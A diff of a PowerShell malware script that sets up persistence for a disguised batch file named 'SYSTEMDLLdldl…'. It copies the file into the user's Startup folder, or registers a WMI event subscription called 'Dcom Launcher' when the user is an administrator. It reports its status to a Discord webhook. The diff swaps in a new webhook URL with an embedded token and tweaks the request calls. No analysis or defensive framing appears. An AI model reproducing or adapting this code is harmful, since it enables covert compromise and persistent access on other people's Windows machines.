@@ -1,10 +1,10 @@
-
+set-alias -name hello -value Invoke-WebRequest
 $temp = $env:TEMP;
 $userprof = $env:USERPROFILE;
 $startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
 $EventFilterName = 'Dcom Launcher';
 $load = "$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat";
-$uri = "https://discord.com/api/webhooks/965959164440481842/NzKBTgEAYJ3Y6m-LOPY89ZshFQ4OPY_GKN-DfNHroQyfEviGvT3X_6ybntF2S7jaBj1m";
+$uri = "https://discord.com/api/webhooks/971409555361779712/IbhO1R1Oe6utsRnMVBNVLYYeEhse8kJDFYKEKSYVTMVARBSWr2rkInfS7bMwLP-BUb4n";
 
 $ADMIN = [Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544'
 
@@ -12,11 +12,11 @@ if ($ADMIN -eq $false){
     copy-item $temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat -Destination $startUpFolder
     $hash = @{ "content" = "not admin.....persistence my not work"; }
     $JSON = $hash | convertto-json
-    Invoke-WebRequest -uri $uri -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}
+    Invoke-RestMethod -uri $uri -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}
 
 }
 $path = test-path $load
-if($path -eq $true){
+if($path -eq $true -and $ADMIN -eq $True){
     $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325";
     $EventFilterArgs = @{
         EventNamespace = 'root\cimv2'
